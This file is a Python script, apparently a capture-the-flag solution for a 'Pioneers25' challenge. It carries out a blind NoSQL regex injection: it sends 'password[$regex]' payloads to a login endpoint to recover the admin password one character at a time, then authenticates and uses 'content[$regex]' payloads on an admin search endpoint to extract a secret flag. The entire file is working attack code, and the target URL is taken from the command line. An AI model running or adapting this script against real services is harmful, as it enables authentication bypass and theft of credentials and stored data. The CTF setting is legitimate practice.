import requests
import string
import sys
import re

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080"

PW_CHARSET = string.ascii_letters + string.digits + "_{}!@#-$"
FLAG_CHARSET = string.ascii_letters + string.digits + "_{}-!"

def rx(prefix: str) -> str:
    # Escape any regex meta characters in extracted prefix
    return "^" + re.escape(prefix)

def stage1_extract_admin_password():
    s = requests.Session()
    prefix = ""

    print("[*] Stage 1: extracting admin password via blind regex...")

    while True:
        found_one = False
        for c in PW_CHARSET:
            data = {
                "username": "admin",
                "password[$regex]": rx(prefix + c)
            }

            r = s.post(BASE + "/login", data=data, allow_redirects=False, timeout=10)
            if r.status_code in (301, 302, 303, 307, 308) and "Location" in r.headers:
                prefix += c
                found_one = True
                print(f"    [+] pw = {prefix}")
                break

        if not found_one:
            print(f"[*] Stage 1 complete. Password = {prefix}")
            return prefix

def login_with_password(password):
    s = requests.Session()
    r = s.post(
        BASE + "/login",
        data={"username": "admin", "password": password},
        allow_redirects=False,
        timeout=10
    )
    if r.status_code not in (301, 302, 303, 307, 308):
        raise RuntimeError("Login failed with extracted password (unexpected).")
    return s

def stage2_extract_flag(session):
    prefix = "Pioneers25{"
    title = "Internal Flag Report"

    print("[*] Stage 2: extracting flag via authenticated blind search...")

    while True:
        if prefix.endswith("}"):
            print(f"[*] Flag complete: {prefix}")
            return prefix

        found_one = False
        for c in FLAG_CHARSET:
            params = [
                ("title", title),
                ("content[$regex]", rx(prefix + c))
            ]
            r = session.get(BASE + "/admin/search", params=params, timeout=10)
            if r.text.strip() == "FOUND":
                prefix += c
                found_one = True
                print(f"    [+] flag = {prefix}")
                break

        if not found_one:
            print("[!] Could not find next character. Try expanding FLAG_CHARSET.")
            print("[!] Current prefix:", prefix)
            return prefix

if __name__ == "__main__":
    pw = stage1_extract_admin_password()
    sess = login_with_password(pw)
    flag = stage2_extract_flag(sess)
    print("\n=== RESULT ===")
    print("admin_password:", pw)
    print("flag:", flag)